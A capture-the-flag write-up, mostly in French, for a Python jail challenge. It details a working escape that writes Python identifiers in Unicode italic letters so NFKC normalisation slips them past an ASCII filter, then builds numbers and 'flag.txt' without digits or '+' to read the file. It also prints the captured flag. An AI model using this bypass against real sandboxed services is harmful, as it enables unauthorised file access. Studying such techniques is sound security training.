# SHA-warma CTF Writeup: Python Jail

## Challenge Overview

- **Event**: SHA-warma CTF
- **Category**: Jail
- **Points**: 500
- **Connection**: `nc 0.cloud.chals.io 21249`

## Description

A Python jail. Find a way to escape and read `flag.txt`.

## Solution Approach

### Step 1: Reconnaissance

On se connecte au service et on teste quelques inputs. On constate rapidement que le serveur filtre agressivement l'input avant de l'exécuter : tous les caractères ASCII alphanumériques sont supprimés, ainsi que la plupart des opérateurs (`+`, `*`, `[`, `]`, `{`, `}`, `<`, `>`, etc.).

Seuls survivent au filtre : les parenthèses `()`, le point `.`, l'underscore `_`, les quotes `'` `"`, le tiret `-`, le slash `/`, et les **caractères Unicode alphabétiques** (multi-octets).

### Step 2: Bypass du filtre via Unicode NFKC

Python 3 normalise les identifiants via [NFKC](https://unicode.org/reports/tr15/) avant de les parser. Cela signifie que des caractères Unicode comme les *Mathematical Sans-Serif Italic* (U+1D608 pour les majuscules, U+1D622 pour les minuscules) sont convertis en leurs équivalents ASCII pour les noms de variables, fonctions et mots-clés.

Par exemple, `𝘱𝘳𝘪𝘯𝘵` (Unicode) est normalisé en `print` par Python, mais le filtre du jail ne le reconnaît pas comme du texte ASCII et le laisse passer.

On vérifie :

```
Input:  𝘱𝘳𝘪𝘯𝘵(''.__𝘤𝘭𝘢𝘴𝘴__)
Filter: print(''.__class__)
Output: <class 'str'>
```

### Step 3: Exploration des builtins

On accède à `__builtins__` pour voir ce qui est disponible :

```
Input:  𝘱𝘳𝘪𝘯𝘵(__𝘣𝘶𝘪𝘭𝘵𝘪𝘯𝘴__)
```

On constate que `__import__`, `exec`, `eval` et `compile` ont été retirés, mais `open`, `chr`, `ord` et `print` sont toujours présents. On peut donc lire le flag avec `open('flag.txt').read()` si on parvient à construire la chaîne `'flag.txt'`.

### Step 4: Construction de nombres sans chiffres

Les chiffres étant filtrés, on utilise les booléens (`True` = 1, `False` = 0) écrits en Unicode, combinés avec l'opérateur `-` (seul opérateur arithmétique non filtré) et `ord()` sur les caractères autorisés.

L'astuce est que `-(False - a - b)` = `a + b` (double négation). On peut donc additionner des termes sans jamais utiliser `+`.

On utilise `𝘰𝘳𝘥('_')` = 95 comme base, puis on ajoute des `𝘛𝘳𝘶𝘦` pour atteindre la valeur voulue :

```python
# Pour obtenir 102 (= 'f') : 95 + 7
-(𝘍𝘢𝘭𝘴𝘦-𝘰𝘳𝘥('_')-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦)
# -> -(0 - 95 - 7) -> -(-102) -> 102
```

### Step 5: Construction de la chaîne `'flag.txt'`

On construit chaque caractère avec `𝘤𝘩𝘳(...)` (par exemple `𝘤𝘩𝘳(-(𝘍𝘢𝘭𝘴𝘦-𝘰𝘳𝘥('_')-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦))` pour `'a'`), puis on les concatène via `.__𝘢𝘥𝘥__()`, l'équivalent de `+` pour les strings (puisque `+` est filtré). Le `.` de `flag.txt` passe le filtre directement.

Valeurs cibles :
| Caractère | ASCII | Calcul |
|-----------|-------|--------|
| `f` | 102 | `ord('_')` + 7 |
| `l` | 108 | `ord('_')` + 13 |
| `a` | 97  | `ord('_')` + 2 |
| `g` | 103 | `ord('_')` + 8 |
| `.` | 46  | littéral `'.'` |
| `t` | 116 | `ord('_')` + 21 |
| `x` | 120 | `ord('_')` + 25 |

### Step 6: Commande finale

On assemble le tout en une seule ligne qui appelle `print(open('flag.txt').read())` entièrement en Unicode. Voici la structure (tronquée pour la lisibilité) :

```python
𝘱𝘳𝘪𝘯𝘵(𝘰𝘱𝘦𝘯(
  𝘤𝘩𝘳(-(𝘍𝘢𝘭𝘴𝘦-𝘰𝘳𝘥('_')-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦))              # 'f'
  .__𝘢𝘥𝘥__(𝘤𝘩𝘳(-(𝘍𝘢𝘭𝘴𝘦-𝘰𝘳𝘥('_')-𝘛𝘳𝘶𝘦-...-𝘛𝘳𝘶𝘦)))     # 'l'
  .__𝘢𝘥𝘥__(𝘤𝘩𝘳(-(𝘍𝘢𝘭𝘴𝘦-𝘰𝘳𝘥('_')-𝘛𝘳𝘶𝘦-𝘛𝘳𝘶𝘦)))         # 'a'
  .__𝘢𝘥𝘥__(𝘤𝘩𝘳(-(𝘍𝘢𝘭𝘴𝘦-𝘰𝘳𝘥('_')-...-𝘛𝘳𝘶𝘦)))          # 'g'
  .__𝘢𝘥𝘥__('.')                                    # '.'
  .__𝘢𝘥𝘥__(𝘤𝘩𝘳(-(𝘍𝘢𝘭𝘴𝘦-𝘰𝘳𝘥('_')-...-𝘛𝘳𝘶𝘦)))          # 't'
  .__𝘢𝘥𝘥__(𝘤𝘩𝘳(-(𝘍𝘢𝘭𝘴𝘦-𝘰𝘳𝘥('_')-...-𝘛𝘳𝘶𝘦)))          # 'x'
  .__𝘢𝘥𝘥__(𝘤𝘩𝘳(-(𝘍𝘢𝘭𝘴𝘦-𝘰𝘳𝘥('_')-...-𝘛𝘳𝘶𝘦)))          # 't'
).𝘳𝘦𝘢𝘥())
```

La ligne complète est envoyée au serveur via :

```bash
printf "<ligne complète en Unicode>\n" | nc 0.cloud.chals.io 21249
```

## Flag

```
sha-CTF{17411c_Un1c0d3_35c4p3_M461c}
```
